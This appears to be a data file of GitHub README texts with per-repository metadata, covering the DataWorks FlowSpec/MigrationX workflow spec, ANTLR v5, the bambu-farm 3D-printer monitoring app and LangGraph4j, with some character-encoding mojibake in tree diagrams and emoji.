| `nodeOutputs` | `Array<`[`NodeOutput`](#nodeOutput)`>` | No       | `nodeOutputs` are list of pre-defined node output identifier strings produced by node |

## Inputs

Inputs are the mechanism for passing parameters, artifacts, volumes from one workflow node to another

### Fields

|  Field Name   |              Field Type              | Required | Description                                                                            |
|:-------------:|:------------------------------------:|----------|----------------------------------------------------------------------------------------|
|   `tables`    |   `Array<`[`Artifact`](#table)`>`    | No       | `tables` are a list of artifact tables passed as inputs                                |
|  `variables`  |  `Array<`[`Variable`](#variable)`>`  | No       | `variables` are a list of `Variable` passed as inputs                                  |
| `nodeOutputs` | `Array<`[`Artifact`](#nodeOutput)`>` | No       | `nodeOutputs` are a list of pre-defined node output identifier string passed as inputs |

## Enumerations

### VariableScope

|   Enum Name   | Description                                                                                    |
|:-------------:|------------------------------------------------------------------------------------------------|
| NodeParameter | `NodeParameter` means the variable is avaliable in a specific node                             |
|  NodeContext  | `NodeContext` means the variable is avaliable in downstream nodes that depends on current node |
|   Workflow    | `Workflow` means the variable is avaliable in all nodes that in current workflow               |
|   Workspace   | `Workspace` means the variable is avaliable in all nodes that in current workspace             |
|    Tenant     | `Tenant` means the variable is avaliable in all nodes that in current tenant workspaces        |

### VariableType

| Enum Name | Description                                                                  |
|:---------:|------------------------------------------------------------------------------|
|  System   | `System` means the variable is avaliable a system variable like: `$yyyymmdd` |
| Constant  | `Constant` means the variable is constant value                              |

### DependencyType

|          Enum Name           | Description                                                                                                                                             |
|:----------------------------:|---------------------------------------------------------------------------------------------------------------------------------------------------------|
|            Normal            | `Normal` means the node instance of current cycle instance depends on the specific node instance in the same cycle round                                |
|   CrossCycleDependsOnSelf    | `CrossCycleDependsOnSelf` means the current cycle instance of the node depends on the previous cycle round instance of the node itself                  |
| CrossCycleDependsOnChildren  | `CrossCycleDependsOnChildren` means the current cycle instance of the node depends on the children instance of itself in the previous cycle round       |
| CrossCycleDependsOnOtherNode | `CrossCycleDependsOnOtherNode` means the current cycle instance of the node depends on the specific node instance of itself in the previous cycle round |

### Recurrence

| Enum Name | Description                                                                                                         |
|:---------:|---------------------------------------------------------------------------------------------------------------------|
|  Normal   | `Normal` means node instance code will be executed as defined repeat cycle, node will be instanced by defined cycle |
|   Skip    | `Skip` means node instance will be set success without any code effects, node will be instanced by defined cycle    |
|   Pause   | `Pause` means node instance will be set failure without any code effects, node will be instanced by defined cycle   |

### RerunMode

|   Enum Name    | Description                                                         |
|:--------------:|---------------------------------------------------------------------|
|    Allowed     | `Allowed` means node instance can be rerun without any precondition |
|     Denied     | `Denied` means node instance cannot be rerun on any condition       |
| FailureAllowed | `FailureAllowed` means node instance can be rerun on failure state  |

### InstanceMode

|  Enum Name  | Description                                                              |
|:-----------:|--------------------------------------------------------------------------|
|     T+1     | `T+1` means node modification will be applied effect on the next day     |
| Immediately | `Immediately` means node modification will be applied effect immediately |    

# FlowSpec Examples

FlowSpec can be used to describe a workflow, it is a json file that contains a list of nodes.

## real case

### EMR/CDH case

* EMR: [yaml](./spec/src/main/spec/examples/yaml/emr.yaml) [json](./spec/src/main/spec/examples/json/emr.json)
* CDH: [yaml](./spec/src/main/spec/examples/yaml/cdh.yaml) [json](./spec/src/main/spec/examples/json/cdh.json)

### example without id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case_expanded.yaml)
* [json](./spec/src/main/spec/examples/json/real_case_expanded.json)

### example with id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case.yaml)
* [json](./spec/src/main/spec/examples/json/real_case.json)

## simple example

* [yaml](./spec/src/main/spec/examples/yaml/simple.yaml)
* [json](./spec/src/main/spec/examples/json/simple.json)

## branch node

* [yaml](./spec/src/main/spec/examples/yaml/branch.yaml)
* [json](./spec/src/main/spec/examples/json/branch.json)

## join node

* [yaml](./spec/src/main/spec/examples/yaml/join.yaml)
* [json](./spec/src/main/spec/examples/json/join.json)

## for-each/do-while node

* [yaml](./spec/src/main/spec/examples/yaml/innerflow.yaml)
* [json](./spec/src/main/spec/examples/json/innerflow.json)

## manual workflow

* [yaml](./spec/src/main/spec/examples/yaml/manual_flow.yaml)
* [json](./spec/src/main/spec/examples/json/manual_flow.json)

## emr nodes

* [yaml](./spec/src/main/spec/examples/yaml/script_runtime_template.yaml)
* [json](./spec/src/main/spec/examples/json/script_runtime_template.json)

## resource example

* [yaml](./spec/src/main/spec/examples/yaml/file_resource.yaml)
* [json](./spec/src/main/spec/examples/json/file_resource.json)

## function example

* [yaml](./spec/src/main/spec/examples/yaml/function.yaml)
* [json](./spec/src/main/spec/examples/json/function.json)

## param-hub node

* [yaml](./spec/src/main/spec/examples/yaml/parameter_node.yaml)
* [json](./spec/src/main/spec/examples/json/parameter_node.json)

# FlowSpec example

## DataWorks migration assistant spec package demo

* the directory structure of the spec package is consistent with the directory tree of the DataWorks DataStudio business process interface
* *.sql, *.sh, *.hql are user script source files
* *.flow is the spec file corresponding to the user script source file

```shell
âœ  project_c_dw tree
.
â””â”€â”€ Business Flow
    â”œâ”€â”€ project_c_dag_3zq3ei4d6
    â”‚   â””â”€â”€ ClickHouse
    â”‚       â””â”€â”€ Data Analytics
    â”‚           â”œâ”€â”€ clickhouse_sql_1.flow
    â”‚           â””â”€â”€ clickhouse_sql_1.sql
    â””â”€â”€ project_c_demo_workflow_1
        â”œâ”€â”€ EMR
        â”‚   â””â”€â”€ Data Analytics
        â”‚       â”œâ”€â”€ demo_hive_sql_1.flow
        â”‚       â”œâ”€â”€ demo_hive_sql_1.hql
        â”‚       â”œâ”€â”€ demo_pg_sql_1.flow
        â”‚       â”œâ”€â”€ demo_pg_sql_1.hql
        â”‚       â”œâ”€â”€ demo_shell_1.flow
        â”‚       â”œâ”€â”€ demo_shell_1.sh
        â”‚       â”œâ”€â”€ demo_sql_1.flow
        â”‚       â””â”€â”€ demo_sql_1.hql
        â””â”€â”€ General
            â”œâ”€â”€ dep_ck_1
            â””â”€â”€ dep_ck_1.flow
```

![DataWorks Migration Package FlowSpec example](docs/images/spec/dw_spec_package_demo-en.jpg)

# FlowSpec Client Tool

MigrationX is a workflow model transformation tool based on FlowSpec.

* [MigrationX](docs/migrationx/index.md)
    * Dolphinscheduler migrate to Dataworks DataStudio in one-click command run
    * Dolphinscheduler export command tool
    * Conversion dolphinscheduler workflow to DataWorks FlowSpec
    * Import FlowSpec package to DataWorks DataStudio with DataWorks OpenAPI

## Architecture

![image](docs/images/architecture-en.jpg)

### Domain Model

Define domain model for different workflow engine, containing domain entities and corresponding operation service

### Reader

Implementations of export reader tools for specific workflow engine.

### Transformer

Implementations of transformation logics between specific workflow engines.

### Writer

Implementations of import writer tools for specific workflow engine.

### Usage

[Usage](docs/migrationx/usage.md)

# Modules

* migrationx-common: common module
* migrationx-domain: domain model of specific workflow engine
* migrationx-reader: export reader implementation of specific workflow engine
* migrationx-transformer: transformer implementation of specific workflow engine
* migrationx-writer: import write implementation of specific workflow engine

# Develop guide

[Develop guide](docs/dev/develop-guide.md)

# Contributors

* Alibaba Cloud-DataWorks-Develop & Modeling & Analytics Team
",0,2,21,13.0,"['introduction', 'flowspec', 'field', 'reference', 'cycleworkflow', 'field', 'manualworkflow', 'field', 'cycleworkflowspec', 'field', 'manualworkflowspec', 'field', 'metadata', 'field', 'node', 'field', 'flow', 'field', 'flowdepend', 'variable', 'field', 'script', 'field', 'trigger', 'field', 'artifact', 'table', 'nodeoutput', 'runtimeresource', 'field', 'fileresource', 'field', 'function', 'field', 'runtime', 'field', 'output', 'field', 'input', 'field', 'enumeration', 'variablescope', 'variabletype', 'dependencytype', 'recurrence', 'rerunmode', 'instancemode', 'flowspec', 'example', 'real', 'case', 'case', 'example', 'without', 'id', 'variable', 'reference', 'example', 'id', 'variable', 'reference', 'simple', 'example', 'branch', 'node', 'join', 'node', 'node', 'manual', 'workflow', 'emr', 'node', 'resource', 'example', 'function', 'example', 'node', 'flowspec', 'example', 'dataworks', 'migration', 'assistant', 'spec', 'package', 'demo', 'flowspec', 'client', 'tool', 'architecture', 'domain', 'model', 'reader', 'transformer', 'writer', 'usage', 'module', 'develop', 'guide', 'contributor']","['field', 'example', 'node', 'flowspec', 'reference']",20.0,"[maven-assembly-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:versions-maven-plugin]",0.0,16.0,4.0
antlr/antlr5,dev,"# ANTLR v5

[![Java 21+](https://img.shields.io/badge/java-21+-4c7e9f.svg)](https://jdk.java.net)
[![License](https://img.shields.io/badge/license-BSD-blue.svg)](https://raw.githubusercontent.com/antlr/antlr5/master/LICENSE.txt)

**ANTLR** (ANother Tool for Language Recognition) is a powerful parser generator for reading, processing, executing, or translating structured text or binary files. It's widely used to build languages, tools, and frameworks. From a grammar, ANTLR generates a parser that can build parse trees and also generates a listener interface (or visitor) that makes it easy to respond to the recognition of phrases of interest.

_This is a new version of ANTLR, in an early development stage_. _If you are looking for a production ready version look into [ANTLR v4](http://antlr4.org/)_.

**Dev branch build status**

[![MacOSX, Windows, Linux](https://github.com/antlr/antlr5/actions/workflows/hosted.yml/badge.svg)](https://github.com/antlr/antlr5/actions/workflows/hosted.yml) (github actions)

## v5 vs v4

ANTLR 4 supports 10 target languages, and each of them requires a dedicated full runtime.
With the advent of [WebAssembly](https://webassembly.org), there is an opportunity to have just 1 runtime, that will run faster with language hosts such as JavaScript or Python.
ANTLR 5 is primarily about that: switching to WebAssembly.
On top of that will come various improvements, currently being specified.

WebAssembly is still being bleeding edge, and the 1st version of ANTLR5 will only support TypeScript.
As other platforms provide support for recent WebAssembly features, such as garbage collection and exception handling, ANTLR5 will rapidly become available for these platforms.

## Repo branch structure

The default branch for this repo is [`main`](https://github.com/antlr/antlr5/tree/main), which is the latest stable release and has tags for the various releases.  Branch [`dev`](https://github.com/antlr/antlr5/tree/dev) is where development occurs between releases and all pull requests should be derived from that branch. The `dev` branch is merged back into `main` to cut a release and the release state is tagged (e.g., with `5.1-rc1` or `5.1`.) Visually our process looks roughly like this:

<img src=""doc/images/new-antlr-branches.png"" width=""500"">

## Authors and major contributors
We're only providing here the list of ANTLR 5 contributors. ANTLR 5 is largely based on ANTLR 4. See [ANTLR 4](https://github.com/antlr/antlr4) for the list of ANTLR 4 contributors, and they are recognized as silent ANTLR 5 authors.

* [Terence Parr](http://www.cs.usfca.edu/~parrt/), parrt@cs.usfca.edu
ANTLR project lead and supreme dictator for life
* [Eric Vergnaud](https://github.com/ericvergnaud) ANTLR 5 project lead
* [Ivan Kochurkin](https://github.com/KvanTTT) major contributor
* [Ken Domino](https://github.com/kaby76) major contributor
* [Jim Idle](https://github.com/jimidle) major contributor
* [Federico Tomassetti](https://github.com/ftomassetti) major contributor

## Useful information

* [Release notes](https://github.com/antlr/antlr5/releases)
* [Getting started with v5](https://github.com/antlr/antlr5/blob/main/doc/getting-started.md)
* [Official site](http://www.antlr.org/)
* [Documentation](https://github.com/antlr/antlr5/blob/main/doc/index.md)
* [FAQ](https://github.com/antlr/antlr5/blob/main/doc/faq/index.md)
* [ANTLR code generation targets](https://github.com/antlr/antlr5/blob/main/doc/targets.md)<br>(Currently: TypeScript)
* _Note: As WebAssembly support grows, we will expand to other mainstream languages. That said, ANTLR 5 architecture supports code generation targets as add-ons, making it easier for anyone in need to support other languages without having to implement the runtime itself._
* [v4 to v5 Migration, differences](https://github.com/antlr/antlr5/blob/main/doc/faq/general.md)

You might also find the following pages useful, particularly if you want to mess around with the various target languages.
 
* [How to build ANTLR itself](https://github.com/antlr/antlr5/blob/main/doc/building-antlr.md)
* [How we create and deploy an ANTLR release](https://github.com/antlr/antlr5/blob/main/doc/releasing-antlr.md)

## The Definitive ANTLR 4 Reference

_Given the fact that work on ANTLR 5 is at a very early stage, there is currently no material about ANTLR 5. However ANTLR 5 is based on the amazing work done in ANTLR 4, and it follows many of the ideas introduced by ANTLR 4. For this reason it makes sense to study the existing material on ANTLR 4._

Programmers run into parsing problems all the time. Whether itâ€™s a data format like JSON, a network protocol like SMTP, a server configuration file for Apache, a PostScript/PDF file, or a simple spreadsheet macro languageâ€”ANTLR v4 and this book will demystify the process. ANTLR v4 has been rewritten from scratch to make it easier than ever to build parsers and the language applications built on top. This completely rewritten new edition of the bestselling Definitive ANTLR Reference shows you how to take advantage of these new features.

You can buy the book [The Definitive ANTLR 4 Reference](http://amzn.com/dp/1934356999) at amazon or an [electronic version at the publisher's site](https://pragprog.com/book/tpantlr2/the-definitive-antlr-4-reference).

You will find the [Book source code](http://pragprog.com/titles/tpantlr2/source_code) useful.

## Additional grammars

As of now, there is no collection of grammars for ANTLR 5, but we plan to grow such collection in [grammars-v5](https://github.com/antlr/grammars-v5), which is currently empty.

Until we get grammars for ANTLR 5, you can take a look at [this repository](https://github.com/antlr/grammars-v4); it is a collection of grammars verified for ANTLR 4 where the root directory name is the all-lowercase name of the language parsed by the grammar. For example, java, cpp, csharp, c, etc...
",0,12,5,33.0,"['antlr', 'v', 'repo', 'branch', 'structure', 'author', 'major', 'contributor', 'useful', 'information', 'the', 'definitive', 'antlr', 'reference', 'additional', 'grammar']","['antlr', 'v', 'repo', 'branch', 'structure']",12.0,"[antlr5-maven-plugin,com.google.code.maven-replacer-plugin:replacer,com.webguys:string-template-maven-plugin,io.takari.maven.plugins:takari-lifecycle-plugin,maven-clean-plugin,maven-jar-plugin,org.antlr:antlr3-maven-plugin,org.antlr:antlr5-maven-plugin,org.apache.felix:maven-bundle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.jetbrains.kotlin:kotlin-maven-plugin,us.bryon:graphviz-maven-plugin]",0.0,10.0,1.0
TFyre/bambu-farm,main,"# Cannot print with latest firmware
> [!IMPORTANT]  
> https://wiki.bambulab.com/en/p1/manual/p1p-firmware-release-history
>
> Bambulab decided to block printing via MQTT unless you enable lanmode only.
>
> Consider downgrading firmware Reference [!142](https://github.com/TFyre/bambu-farm/issues/142)


# Bambu Farm
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/tfyre)


Web based application to monitor multiple bambu printers using mqtt / ftp / rtsp (**no custom firmware required**)

Technologies used:
* Java 21 https://www.azul.com/
* Quarkus https://quarkus.io/
* Vaadin https://vaadin.com/

# Features / Supported Devices

| Feature | A1 | A1 Mini | P1P | P1S | X1C|
|--|:--:|:--:|:--:|:--:|:--:|
|**Remote View**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>3</sup></li></ul>|
|**Upload to SD card**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .3mf from SD card**<sup>1</sup>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .gcode from SD card**|?|?|?|?|?|
|**Batch Printing**<sup>4</sup>|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**AMS**|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|
|**Send Custom GCode**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|

1. **Currently only .3mf sliced projects are supported.**
  > In Bambu Studio/Orca slicer, make sure to slice the place and then use the ""File -> Export -> Export plate sliced file"". This creates a `.3mf` project with embedded `.gcode` plate.
2. **FTPS Connections needs SSL Session Reuse via [Bouncy Castle](#bouncy-castle)**
> Without enabling bouncy castle, you will see `552 SSL connection failed: session resuse required`
3. Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.
4. **Batch Priting** allows you to upload a single/multi sliced .3mf and select which plate to send to multiple printers, each with their own filament mapping.

# Screenshots

* Dashboard
![Desktop browser](/docs/bambufarm1.jpg)
* Batch printing
![Batch Printing](/docs/batchprint.png)

*More screenshots in [docs](/docs)*

# I just want to run it

* Make sure you have Java 21 installed, verify with `java -version`
```bash
[user@build:~]# java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Zulu21.30+15-CA (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Zulu21.30+15-CA (build 21.0.1+12-LTS, mixed mode, sharing)
```
* Download the latest `bambu-web-*-runner.jar` from [releases](https://github.com/TFyre/bambu-farm/releases/latest) into a new folder (or use the 1 liner below):
```bash
curl -s https://api.github.com/repos/tfyre/bambu-farm/releases/latest \
  | grep browser_download_url | cut -d'""' -f4 | xargs curl -LO
```
* Create a `.env` config file from [Minimal Config](#minimal-config)
  * *Check out the [Full Config Options](#full-config-options) section if you want to tweak some settings*
* Run with `java -jar bambu-web-x.x.x-runner.jar`
```bash
[user@build:~]# java -jar bambu-web-1.0.1-runner.jar
__  ____  __  _____   ___  __ ____  ______
 --/ __ \/ / / / _ | / _ \/ //_/ / / / __/
 -/ /_/ / /_/ / __ |/ , _/ ,< / /_/ /\ \
--\___\_\____/_/ |_/_/|_/_/|_|\____/___/
2024-01-23 08:49:05,586 INFO  [io.und.servlet] (main) Initializing AtmosphereFramework
...
...
2024-01-23 08:49:05,666 INFO  [com.vaa.flo.ser.DefaultDeploymentConfiguration] (main) Vaadin is running in production mode.
2024-01-23 08:49:05,912 INFO  [org.apa.cam.qua.cor.CamelBootstrapRecorder] (main) Bootstrap runtime: org.apache.camel.quarkus.main.CamelMainRuntime
2024-01-23 08:49:05,913 INFO  [org.apa.cam.mai.MainSupport] (main) Apache Camel (Main) 4.2.0 is starting
...
...
2024-01-23 08:49:06,029 INFO  [com.tfy.bam.cam.CamelController] (main) configured
2024-01-23 08:49:06,074 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) is starting
2024-01-23 08:49:06,081 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Routes startup (total:10 started:0 disabled:10)
...
...
2024-01-23 08:49:06,085 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) started in 10ms (build:0ms init:0ms start:10ms)
2024-01-23 08:49:06,193 INFO  [io.quarkus] (main) bambu-web 1.0.1 on JVM (powered by Quarkus 3.6.6) started in 1.421s. Listening on: http://0.0.0.0:8084
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Profile prod activated.
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Installed features: [camel-core, camel-direct, camel-paho, cdi, resteasy-reactive, resteasy-reactive-jackson, 
scheduler, security, servlet, smallrye-context-propagation, vaadin-quarkus, vertx, websockets, websockets-client]
```
* If starting correctly, it will show `Routes startup (total:10 started:0 disabled:10)` with a number that is 2x your printer count
* Head over to http://127.0.0.1:8080 and log in with `admin` / `admin`

# Building & Running

Building:
```bash
mvn clean install -Pproduction
```

Create a new directory and copy `bambu/target/bambu-web-1.0.0-runner.jar` into it, example:
```bash
tfyre@fsteyn-pc:/mnt/c/bambu-farm$ ls -al
total 64264
drwxrwxrwx 1 tfyre tfyre     4096 Jan 17 16:47 .
drwxrwxrwx 1 tfyre tfyre     4096 Jan 18 20:42 ..
-rw-rw-rw- 1 tfyre tfyre     4557 Jan 18 14:01 .env
-rw-rw-rw- 1 tfyre tfyre 65796193 Jan 18 20:38 bambu-web-1.0.0-runner.jar
```

Running
```bash
java -jar bambu-web-1.0.0-runner.jar
```

You can now access it via http://127.0.0.1:8080 (username: admin / password: admin)

# Running as a service

Refer to [README.service.md](/docs/README.service.md)

# Example Config

## Minimal config

**!!Remeber to replace `REPLACE_*` fields!!**

Create an `.env` file with  the following config:
```properties
quarkus.http.host=0.0.0.0
quarkus.http.port=8080

bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP

bambu.users.admin.password=admin
bambu.users.admin.role=admin
```

## Full Config Options

**All default options are displayed (only add to the config if you want to change)**

### Dark Mode
```properties
# Gobal
bambu.dark-mode=false
# Per user (will default to global if omitted)
bambu.users.myUserName.dark-mode=false
```

### Printer section
```properties
bambu.printers.myprinter1.enabled=true
bambu.printers.myprinter1.name=Name With Spaces
bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.username=bblp
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP
bambu.printers.myprinter1.use-ams=true
bambu.printers.myprinter1.timelapse=true
bambu.printers.myprinter1.bed-levelling=true
bambu.printers.myprinter1.flow-calibration=true
bambu.printers.myprinter1.vibration-calibration=true
bambu.printers.myprinter1.model=unknown / a1 / a1mini / p1p / p1s / x1c
bambu.printers.myprinter1.mqtt.port=8883
bambu.printers.myprinter1.mqtt.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.mqtt.port}
bambu.printers.myprinter1.mqtt.report-topic=device/${bambu.printers.myprinter1.device-id}/report
bambu.printers.myprinter1.mqtt.request-topic=device/${bambu.printers.myprinter1.device-id}/request
#Requesting full status interval
bambu.printers.myprinter1.mqtt.full-status=10m
bambu.printers.myprinter1.ftp.port=990
bambu.printers.myprinter1.ftp.url=ftps://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.ftp.port}
bambu.printers.myprinter1.ftp.log-commands=false
bambu.printers.myprinter1.stream.port=6000
bambu.printers.myprinter1.stream.live-view=false
bambu.printers.myprinter1.stream.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.stream.port}
#Restart stream if no images received interval
bambu.printers.myprinter1.stream.watch-dog=5m
```

### User Section

**Remember to encrypt your passwords with bcrypt (eg https://bcrypt-generator.com/)**

Current roles supported:

* `admin` - full access
* `normal` - only dashboard with readonly access

```properties
# https://bcrypt-generator.com/
#bambu.users.REPLACE_WITH_USERNAME.password=REPLACE_WITH_PASSWORD

# Insecure version:
#bambu.users.myUserName.password=myPassword
# Secure version:
bambu.users.myUserName.password=$2a$12$GtP15HEGIhqNdeKh2tFguOAg92B3cPdCh91rj7hklM7aSOuTMh1DC 
bambu.users.myUserName.role=admin
bambu.users.myUserName.dark-mode=false

#Guest account with readonly role
bambu.users.guest.password=guest
bambu.users.guest.role=normal

# Skip users and automatically login as admin (default: false)
bambu.auto-login=true
```

### Preheat

Default preheat configuration is below:
```properties
bambu.preheat[0].name=Off 0/0
bambu.preheat[0].bed=0
bambu.preheat[0].nozzle=0
bambu.preheat[1].name=PLA 55/220
bambu.preheat[1].bed=55
bambu.preheat[1].nozzle=220
bambu.preheat[2].name=ABS 90/270
bambu.preheat[2].bed=90
bambu.preheat[2].nozzle=270
```

### Remote View

Remote View is the ability to remotely view or stream the printer's camera.

```properties
# defaults to true, when false, disables remote view globally
bambu.remote-view=true

# defaults to true, when false, disables remote view for dashboard, but will still be available in detail view
bambu.dashboard.remote-view=true

# defaults to true, when false, disables per printer
bambu.printers.myprinter1.stream.enable=true
```


### Live View

Live View is the ability to remotely stream the X1C camera (or any other webcam) and requires Remote View to be enabled.

> [!NOTE]
> Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.


```properties
bambu.live-view-url=/_camerastream/

# For each printer:
bambu.printers.PRINTER_ID.stream.live-view=true

# Default LiveView URL
bambu.printers.PRINTER_ID.stream.url=${bambu.live-view-url}${PRINTER_ID}

# Custom LiveView URL
bambu.printers.PRINTER_ID.stream.url=https://my_stream_domain.com/mystream
# 
```


### Bouncy Castle
`X1C` needs SSL Session Reuse so that SD Card functionality can work. Reference: https://stackoverflow.com/a/77587106/23289205

Without this you will see `552 SSL connection failed: session resuse required`.

Add to `.env`:
```properties
bambu.use-bouncy-castle=true
```
Add JVM startup flag:

bash / cmd:
```bash
java -Djdk.tls.useExtendedMasterSecret=false -jar bambu-web-x.x.x-runner.jar
```

powershell:
```powershell
java ""-Djdk.tls.useExtendedMasterSecret=false"" -jar bambu-web-x.x.x-runner.jar
```

### Uploading bigger files

Add to `.env`:
```properties
quarkus.http.limits.max-body-size=30M
```

### Configure XY/Z movement speeds

Add to `.env`:
```properties
# values are in mm/minute
bambu.move-xy=5000
bambu.move-z=3000
```

### Use Right click for menus

Add to `.env`:
```properties
bambu.menu-left-click=false
```

### Custom CSS

If you want to modify the CSS, create a file next to the `.jar` file called `styles.css`

* Changing the display columns

*Display columns is a ratio and scale based on screen width*

Refer to [bambu.css](/bambu/frontend/themes/bambu-theme/bambu.css#L1-L25)

| Example | value for XXX |
| -- | -- |
| always 1 column | 1 |
| 2 columns with 1080p | 3 |
| 4 columns with 1080p | 5 |

```css
:root {
  --bambu-default-columns: XXX;
}
```

# Debug

For debugging the application, add the following to .env and uncomment DEBUG or TRACE logging sections

```properties
### Log To File
quarkus.log.file.enable=true
quarkus.log.file.path=application.log


### DEBUG logging
#quarkus.log.category.""com.tfyre"".level=DEBUG


### TRACE logging
#quarkus.log.min-level=TRACE
#quarkus.log.category.""com.tfyre"".min-level=TRACE
#quarkus.log.category.""com.tfyre"".level=TRACE
```

# Links

## Inspirational Web interface

* https://github.com/davglass/bambu-farm/tree/main

## Printer MQTT Interface

* https://github.com/Doridian/OpenBambuAPI/blob/main/mqtt.md
* https://github.com/xperiments-in/xtouch/blob/main/src/xtouch/device.h
* https://github.com/SoftFever/OrcaSlicer/blob/main/src/slic3r/GUI/DeviceManager.hpp

## Remoteview

* https://github.com/bambulab/BambuStudio/issues/1536#issuecomment-1811916472


## Images from

* https://github.com/SoftFever/OrcaSlicer/tree/main/resources/images

## Json to Proto

* https://json-to-proto.github.io/
* https://formatter.org/protobuf-formatter
",13,26,4,11.0,"['can', 'not', 'print', 'late', 'firmware', 'bambu', 'farm', 'feature', 'supported', 'device', 'screenshots', 'i', 'want', 'run', 'java', 'java', 'building', 'running', 'run', 'service', 'example', 'config', 'minimal', 'config', 'full', 'config', 'option', 'dark', 'mode', 'gobal', 'per', 'user', 'will', 'default', 'global', 'omit', 'printer', 'section', 'user', 'section', 'http', 'insecure', 'version', 'secure', 'version', 'skip', 'user', 'automatically', 'login', 'admin', 'default', 'false', 'preheat', 'remote', 'view', 'default', 'true', 'false', 'disables', 'remote', 'view', 'globally', 'default', 'true', 'false', 'disables', 'remote', 'view', 'dashboard', 'still', 'available', 'detail', 'view', 'default', 'true', 'false', 'disables', 'per', 'printer', 'live', 'view', 'for', 'printer', 'default', 'liveview', 'url', 'custom', 'liveview', 'url', 'bouncy', 'castle', 'upload', 'big', 'file', 'configure', 'movement', 'speed', 'value', 'use', 'right', 'click', 'menu', 'custom', 'cs', 'debug', 'log', 'to', 'file', 'debug', 'logging', 'trace', 'log', 'link', 'inspirational', 'web', 'interface', 'printer', 'mqtt', 'interface', 'remoteview', 'image', 'json', 'proto']","['default', 'view', 'printer', 'false', 'config']",4.0,"[com.vaadin:vaadin-maven-plugin,io.quarkus:quarkus-maven-plugin,io.smallrye:jandex-maven-plugin,maven-failsafe-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:jaxb2-maven-plugin]",0.0,3.0,1.0
bsorrentino/langgraph4j,main,"
# ğŸ¦œğŸ•¸ï¸ LangGraph for Java

[![Javadoc](https://img.shields.io/badge/Javadoc-Documentation-blue)][javadocs] [![Static Badge](https://img.shields.io/badge/maven--snapshots-1.0--SNAPSHOT-blue)][snapshots] [![Maven Central](https://img.shields.io/maven-central/v/org.bsc.langgraph4j/langgraph4j-core-jdk8.svg)][releases]

LangGraph for Java. A library for building stateful, multi-agents applications with LLMs, built for work with [langchain4j]
> It is a porting of original [LangGraph] from [LangChain AI project][langchain.ai] in Java fashion

## Features

- [x] StateGraph
- [x] Nodes
- [x] Edges
- [x] Conditional Edges
- [x] Entry Points
- [x] Conditional Entry Points
- [x] State
  - [x] Schema (_a series of Channels_)
    - [x] Reducer (_how apply  updates to the state attributes_)
    - [x] Default provider
    - [x] AppenderChannel (_values accumulator_)
- [x] Compiling graph    
- [x] Async support (_throught [CompletableFuture]_)
- [x] Streaming support (_throught [java-async-generator]_)
- [x] Checkpoints (_save and replay feature_)
- [x] Graph visualization
  - [x] [PlantUML]
  - [x] [Mermaid]
- [x] Playground (_Embeddable Webapp that plays with LangGraph4j_)
- [x] Threads (_checkpointing of multiple different runs_)
- [x] Update state (_interact with the state directly and update it_)
- [x] Breakpoints (_pause and resume feature_)
- [ ] Parallel Node Execution

## Samples

* [Agent Executor](agent-executor/README.md)
* [Image To PlantUML Diagram](image-to-diagram/README.md)
* [Adaptive RAG](adaptive-rag/README.md)

## How To(s)

* [How to add persistence (""memory"") to your graph](how-tos/persistence.ipynb)
* [How to view and update past graph state](how-tos/time-travel.ipynb)

## Releases

| Date         | Release        | info
|--------------|----------------| ---
| Sep 24, 2024 | `1.0-beta5` | last official beta release


## Quick Start 

